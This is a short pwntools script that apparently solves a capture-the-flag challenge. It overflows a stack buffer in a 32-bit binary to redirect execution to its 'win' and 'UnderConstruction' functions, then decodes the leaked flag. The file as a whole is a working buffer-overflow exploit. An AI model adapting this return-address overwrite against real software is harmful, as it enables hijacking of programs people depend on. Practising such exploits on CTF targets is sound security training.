#!/usr/bin/env python3
from pwn import *

BIN_FILE  = './chall'
LIBC_FILE = ''

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='i386')
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)

def parse(io):
    io.recvuntil('0x')
    leak = io.recv(8)
    f = ''
    for i in range(0, 7, 2):
        f += chr(int(leak[i:i+2], 16))
    return f

def attack(io):
    payload = b'a' * 14
    payload += p32(binf.sym.win)
    payload += p32(binf.sym.UnderConstruction)

    io.sendlineafter('flag\n', payload) 
    io.recvuntil(': ')

    FLAG = ''
    for i in range(10):
        FLAG += parse(io)
    success('Got the flag: '+FLAG[::-1])

def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
